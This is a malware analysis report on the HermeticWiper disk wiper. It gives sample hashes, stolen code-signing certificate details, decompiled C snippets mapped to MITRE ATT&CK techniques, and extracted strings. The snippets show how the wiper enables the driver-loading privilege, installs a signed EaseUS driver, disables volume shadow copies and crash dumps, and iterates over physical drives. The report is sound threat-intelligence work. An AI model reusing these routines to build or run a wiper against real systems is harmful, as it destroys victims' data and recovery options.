1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591 - metadata

```json
    "General": {
        "PE Type": "exe",
        "Entrypoint": "15232",
        "Entrypoint Section": ".text",
        "Header checksum": "0x1f2fd",
        "Verify checksum": "0x1f2fd",
        "Match checksum": "True",
        "Sig": "558bec83e4f881ec240500005356576a708d44246cc744241c000000006a0050c744242800000000c744241800000000c7442438",
        "imphash": "fe4a2284122da348258c83ef437fbd7b",
        "warning": "None",
        "Timestamp": "2022-02-23 01:48:53"
    },
```
<br /><br />
1bc44eef75779e3ca1eefb8ff5a64807dbc942b1e4a2672d77b9f6928d292591 - signed - T1553.002 Code Signing

```json
    "SignatureExtracted": {
        "CERT_0": {
            "CommonName": "Hermetica Digital Ltd",
            "OrganizationalUnit": "None",
            "Organization": "Hermetica Digital Ltd",
            "Locality": "Nicosia",
            "StateOrProvinceName": "None",
            "CountryName": "CY",
            "Start": "Apr 13 00:00:00 2021 GMT",
            "Ends": "Apr 14 23:59:59 2022 GMT",
            "SerialNumber": "16326917005263794892010201328953498860",
            "SerialNumberMD5": "94bc2ff3969d9775de508e1181318deb"
        }
    },
```
<br /><br />
0385eeab00e946a302b24a91dea4187c1210597b8e17cd9e2230450f5ece21da - metadata

```json
    "General": {
        "PE Type": "exe",
        "Entrypoint": "15232",
        "Entrypoint Section": ".text",
        "Header checksum": "0x2b718",
        "Verify checksum": "0x2b718",
        "Match checksum": "True",
        "Sig": "558bec83e4f881ec240500005356576a708d44246cc744241c000000006a0050c744242800000000c744241800000000c7442438",
        "imphash": "4233d97404e1fecedef6a46e0f7c09b9",
        "warning": "None",
        "Timestamp": "2021-12-28 00:37:16"
    },
```
<br /><br />
0385eeab00e946a302b24a91dea4187c1210597b8e17cd9e2230450f5ece21da - signed - T1553.002 Code Signing

```json
    "SignatureExtracted": {
        "CERT_0": {
            "CommonName": "Hermetica Digital Ltd",
            "OrganizationalUnit": "None",
            "Organization": "Hermetica Digital Ltd",
            "Locality": "Nicosia",
            "StateOrProvinceName": "None",
            "CountryName": "CY",
            "Start": "Apr 13 00:00:00 2021 GMT",
            "Ends": "Apr 14 23:59:59 2022 GMT",
            "SerialNumber": "16326917005263794892010201328953498860",
            "SerialNumberMD5": "94bc2ff3969d9775de508e1181318deb"
        }
    },
```
<br /><br />
Hermetica Digital Ltd - is company that was registered in Cyprus on 16/03/2021

![](https://raw.githubusercontent.com/qeeqbox/reports/main/HermeticaWiper/files/company.png)

<br /><br />
sub_4029d0 (Function) 
```c
```

<br /><br />
dynamically get Wow64DisableWow64FsRedirection from kernel32.dll

```c
  v2 = GetModuleHandleW(L"kernel32.dll");
  v38 = wnsprintfW(pszDest, 260, L"\\??\\");
  if ( v2 )
  {
    Wow64DisableWow64FsRedirection = (BOOL (__stdcall *)(PVOID *))GetProcAddress(v2, "Wow64DisableWow64FsRedirection");
    GetProcAddress(v2, "Wow64RevertWow64FsRedirection");
```
<br /><br />
Check if process is 64bit - T1082 System Information Discovery

```c
    IsWow64Process = (BOOL (__stdcall *)(HANDLE, PBOOL))GetProcAddress(v2, "IsWow64Process");
    if ( IsWow64Process )
    {
      v4 = GetCurrentProcess();
      IsWow64Process(v4, &v40);
    }
  }
```
<br /><br />
Checking windwos version - T1082 System Information Discovery 

```c
  memset(&VersionInformation, 0, sizeof(VersionInformation));
  VersionInformation.dwOSVersionInfoSize = 284;
  VersionInformation.dwMajorVersion = 6;
  VersionInformation.dwMinorVersion = 0;
  v5 = VerSetConditionMask(0i64, 2u, 3u);
  v6 = VerSetConditionMask(v5, 1u, 3u);
```
<br /><br />
Based on the checking, load the sys driver (It's legit but used as diskwipe - T1561 Disk Wipe)

```c
  if ( VerifyVersionInfoW(&VersionInformation, 3u, v6) )
  {
    if ( v40 )
      v7 = FindResourceW(hModule, L"DRV_X64", L"RCDATA");
    else
      v7 = FindResourceW(hModule, L"DRV_X86", L"RCDATA");
  }
  else
  {
    if ( GetLastError() != 1150 )
      return 0;
    v35 = 1;
    if ( v40 )
      v7 = FindResourceW(hModule, L"DRV_XP_X64", L"RCDATA");
    else
      v7 = FindResourceW(hModule, L"DRV_XP_X86", L"RCDATA");
  }
```
<br /><br />
Now, disable Windows file system redirection (Do not use C:\Windows\syswow64, use system32 instead)

```c
  nNumberOfBytesToWrite = SizeofResource(hModule, v8);
  if ( v40 && Wow64DisableWow64FsRedirection )
    Wow64DisableWow64FsRedirection((PVOID *)&v31);
  phkResult = 0;
```
<br /><br />
Disable Windows crash dump

```c
  if ( !RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\CrashControl", &phkResult) )
  {
    *(_DWORD *)Data = 0;
    RegSetValueExW(phkResult, L"CrashDumpEnabled", 0, 4u, Data, 4u);
    RegCloseKey(phkResult);
  }
```
<br /><br />
Create random file with in the system32\drivers - T1036 Masquerading: Match Legitimate Name or Location

```c
  wnsprintfW(Destination, 260, L"\\\\.\\EPMNTDRV\\%u", 0);
  v10 = (void *)sub_401870(Destination, 0, 0);
  if ( !v10 || v10 == (void *)-1 )
  {
    *(_DWORD *)Data = &pszDest[v38];
    if ( GetSystemDirectoryW(*(LPWSTR *)Data, 0x104u) )
    {
      PathAppendW(pszDest, L"Drivers");
      PathAddBackslashW(pszDest);
      v38 = 26;
      v12 = &pszDest[wcslen(pszDest)];
      do
      {
        v32[0] = 6422625;
        v32[1] = 6553699;
        v32[2] = 6684773;
        v32[3] = 6815847;
        v32[4] = 6946921;
        v32[5] = 7077995;
        v32[6] = 7209069;
        v32[7] = 7340143;
        v32[8] = 7471217;
        v32[9] = 7602291;
        v32[10] = 7733365;
        v32[11] = 7864439;
        v32[12] = 7995513;
        v13 = GetCurrentProcessId();
        v14 = (v13 + 1) % 0xFFF1;
        *v12 = *((_WORD *)v32 + (v14 + ((v14 % 0xFFF1) << 16)) % v38);
        v12[1] = *((_WORD *)v32
                 + ((v14 + v13) % 0xFFF1 + (((v14 % 0xFFF1 + (v14 + v13) % 0xFFF1) % 0xFFF1) << 16)) % 0x1A);
        StrCatBuffW(v12 + 1, L"drv", 4);
        v12[6] = 0;
      }
      while ( PathFileExistsW(pszDest) );
      v15 = PathFindExtensionW(v12) - v12;
      wcsncpy(Destination, v12, v15);
      v16 = *(WCHAR **)Data;
      Destination[v15] = 0;
      v17 = CreateFileW(v16, 0x40000000u, 0, 0, 2u, 0, 0);
      v18 = (void (__stdcall *)(LPCWSTR))DeleteFileW;
      v19 = v17;
      if ( v17 && v17 != (HANDLE)-1 )
      {
        phkResult = 0;
        if ( WriteFile(v17, lpBuffer, nNumberOfBytesToWrite, (LPDWORD)&phkResult, 0)
          && phkResult == (HKEY)nNumberOfBytesToWrite )
        {
          if ( v19 != (void *)-1 )
          {
            FlushFileBuffers(v19);
            CloseHandle(v19);
          }
        }
        else
        {
          CloseHandle(v19);
          DeleteFileW(v16);
        }
      }
      sub_4023C0(v16, v34);
```
<br /><br />
If everything is good, create the same one but with .sys

```sh
      v20 = LZOpenFileW(v16, &ReOpenBuf, 2u);
      if ( v20 >= 0 )
      {
        PathAddExtensionW(pszDest, L".sys");
        v21 = (const void *)LZOpenFileW(v16, &v27, 0x1002u);
        lpBuffer = v21;
        if ( (int)v21 >= 0 )
        {
          v22 = LZCopy(v20, (INT)v21);
          LZClose(v20);
          LZClose((INT)lpBuffer);
```
<br /><br />
Setup the driver

```sh
              v23 = StrStrIW(v16, L"System32");
            v33 = sub_403930(v23, Destination);
```
<br /><br />
Explicitly enable the SeLoadDriverPrivilege privilege (This is one of the privileges that is disabled by default) - T1134 Access Token Manipulation

```sh
  v3 = GetProcessHeap();
  v4 = (struct _TOKEN_PRIVILEGES *)HeapAlloc(v3, 8u, 0x40u);
  if ( v4 )
  {
    v5 = GetCurrentProcess();
    if ( OpenProcessToken(v5, 0x28u, &TokenHandle) )
    {
      LookupPrivilegeValueW(0, L"SeLoadDriverPrivilege", (PLUID)v4->Privileges);
      v4->PrivilegeCount = 1;
      v4->Privileges[0].Attributes = 2;
      hSCManager = (SC_HANDLE)AdjustTokenPrivileges(TokenHandle, 0, v4, 0, 0, 0);
    }
    GetLastError();
    v6 = GetProcessHeap();
    HeapFree(v6, 0, v4);
    if ( hSCManager )
    {
      if ( lpBinaryPathName )
      {
```
<br /><br />
Use that privilege to load the .sys driver (the driver name is passed to this function) - T1543.003 Create or Modify System Process: Windows Service 

```sh
        v7 = OpenSCManagerW(0, L"ServicesActive", 3u);
        hSCManager = v7;
        if ( !v7 )
        {
          v8 = GetLastError();
          SetLastError(v8);
          return 0;
        }
        v10 = OpenServiceW(v7, lpServiceName, 0x16u);
        if ( v10 )
        {
          ServiceStatus.dwWaitHint = 0;
          *(_OWORD *)&ServiceStatus.dwServiceType = 0i64;
          *(_QWORD *)&ServiceStatus.dwServiceSpecificExitCode = 0i64;
          if ( QueryServiceStatus(v10, &ServiceStatus) )
          {
            v2 = ServiceStatus.dwCurrentState == 4;
          }
          else if ( !ChangeServiceConfigW(v10, 1u, 3u, 1u, lpBinaryPathName, 0, 0, 0, 0, 0, 0) )
          {
            v15 = v10;
            v12 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;
            v11 = GetLastError();
            CloseServiceHandle(v15);
            goto LABEL_13;
          }
        }
        else
        {
          v11 = GetLastError();
          if ( v11 != 1060 )
          {
LABEL_12:
            v12 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;
LABEL_13:
            v12(hSCManager);
            SetLastError(v11);
            return v2;
          }
          v10 = CreateServiceW(
                  hSCManager,
                  lpServiceName,
                  lpServiceName,
                  0xF01FFu,
                  1u,
                  3u,
                  1u,
                  lpBinaryPathName,
                  0,
                  0,
                  0,
                  0,
                  0);
          if ( !v10 )
          {
            v11 = GetLastError();
            goto LABEL_12;
          }
          v19 = 1;
        }
        for ( i = 0; i < 5; ++i )
        {
          if ( v2 )
            break;
          v2 = StartServiceW(v10, 0, 0);
          Sleep(0x3E8u);
        }
        v11 = 0;
        if ( !v2 )
        {
          v11 = GetLastError();
          if ( v11 == 1056 )
          {
            v14 = v10;
            v12 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;
            v2 = 1;
            CloseServiceHandle(v14);
            goto LABEL_13;
          }
          if ( v19 )
            DeleteService(v10);
        }
        v16 = v10;
        v12 = (void (__stdcall *)(SC_HANDLE))CloseServiceHandle;
        CloseServiceHandle(v16);
        goto LABEL_13;
      }
    }
  }
  return 0;

```
<br /><br />
Delete the entry from services - T1070 Indicator Removal on Host 

```sh
            if ( v33 )
            {
              wsprintfW(SubKey, L"%s%s", L"SYSTEM\\CurrentControlSet\\services\\", Destination);
              RegDeleteKeyW(HKEY_LOCAL_MACHINE, SubKey);
            }
          }
          sub_4023C0(v16, v34);
          v18 = (void (__stdcall *)(LPCWSTR))DeleteFileW;
        }
        else
        {
          LZClose(v20);
        }
      }
```
<br /><br />
Random file will be dropped (Contains the data\driver from resources) + extracting it with `expand`

```sh
$ file dbdr
dbdr: MS Compress archive data, SZDD variant, original size: 17480 bytes
$ expand dbdr driver
driver: PE32+ executable (native) x86-64, for MS Windows
```
<br /><br />
driver is legit 

```json
    "General": {
        "PE Type": "driver",
        "Entrypoint": "24584",
        "Entrypoint Section": "INIT",
        "Header checksum": "0xc37c",
        "Verify checksum": "0xc37c",
        "Match checksum": "True",
        "Sig": "488b05f1e0ffff49b932a2df2d992b00004885c07405493bc1752f4c8d05d6e0ffff48b82003000080f7ffff488b004933c049b8",
        "imphash": "5bba6eb3fccad3d563d56ef2d7e5d5e8",
        "warning": [
            "Suspicious flags set for section 4. Both IMAGE_SCN_MEM_WRITE and IMAGE_SCN_MEM_EXECUTE are set. This might indicate a packed executable."
        ],
        "Timestamp": "2008-08-14 18:11:21"
    },
```
<br /><br />
driver sig is EaseUS - T1553.002 Code Signing

```json
    "SignatureExtracted": {
        "CERT_0": {
            "CommonName": "CHENGDU YIWO Tech Development Co., Ltd.",
            "OrganizationalUnit": "Digital ID Class 3 - Microsoft Software Validation v2",
            "Organization": "CHENGDU YIWO Tech Development Co., Ltd.",
            "Locality": "Chengdu",
            "StateOrProvinceName": "None",
            "CountryName": "CN",
            "Start": "Apr 23 00:00:00 2012 GMT",
            "Ends": "Sep 11 23:59:59 2014 GMT",
            "SerialNumber": "68804683173832892932091550486902617573",
            "SerialNumberMD5": "705edf5c1af78770de4153bccb757055"
        }
    },
```
<br /><br />
Disable vss - T1490 Inhibit System Recovery

```c
        v14 = 0;
        v15 = OpenSCManagerW(0, L"ServicesActive", 0xF003Fu);
        TokenHandle.dwLowDateTime = (DWORD)v15;
        if ( v15 )
        {
          v16 = OpenServiceW(v15, L"vss", 0x22u);
          v17 = v16;
          if ( v16 )
          {
            if ( !ChangeServiceConfigW(v16, 0x10u, 4u, 0xFFFFFFFF, 0, 0, 0, 0, 0, 0, 0) )
              v14 = v11();
            ControlService(v17, 1u, 0);
            CloseServiceHandle(v17);
            CloseServiceHandle((SC_HANDLE)TokenHandle.dwLowDateTime);
          }
          else
          {
            v14 = v11();
            CloseServiceHandle((SC_HANDLE)TokenHandle.dwLowDateTime);
          }
        }
        else
        {
          v14 = v11();
        }
```
<br /><br />
Loop through PhysicalDrive 0 to 100

```c
        SetLastError(v14);
        if ( GetModuleFileNameW(0, Filename, 0x104u) )
          sub_4023C0(Filename, (int)&v39);
        for ( i = 0; i <= 100; ++i )
          sub_401D60(i, (int)&v40, (void (__stdcall *)(void *, char *, int, int, DWORD, LONG))sub_401D10);

```

## Dumped 
```
FATNTFS
\\.\PhysicalDrive%u
\\.\EPMNTDRV\%u
\\.\
%s%.2s
$Bitmap
$LogFile
\??\
\\?\
ntuser
.sys
AppData
My Documents
Desktop
\\?\C:\Documents and Settings
\\?\C:\Windows\System32\winevt\Logs
kernel32.dll
Wow64DisableWow64FsRedirection
Wow64RevertWow64FsRedirection
IsWow64Process
RCDATA
DRV_X64
DRV_X86
DRV_XP_X64
DRV_XP_X86
Drivers
drv
System32
SYSTEM\CurrentControlSet\services\
%s%s
Windows
Program Files
Program Files(x86)
PerfLogs
Boot
System Volume Information
%ws%.2ws
%ws%ws
\*
.
..
SeLoadDriverPrivilege
ServicesActive
c*
SeBackupPrivilege
C:\Windows\SYSVOL
C:\System Volume Information
Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced
ShowCompColor
ShowInfoTip
SYSTEM\CurrentControlSet\Control\CrashControl
CrashDumpEnabled
$ATTRIBUTE_LIST
$EA
$EA_INFORMATION
$SECURITY_DESCRIPTOR
$DATA
$INDEX_ROOT
$INDEX_ALLOCATION
$BITMAP
$REPARSE_POINT
$LOGGED_UTILITY_STREAM
$I30
$INDEX_ALLOCATION
```

##  References
- [ESET](https://twitter.com/ESETresearch/status/1496581903205511181)
- [Threat Intelligence](https://twitter.com/threatintel/status/1496578746014437376)

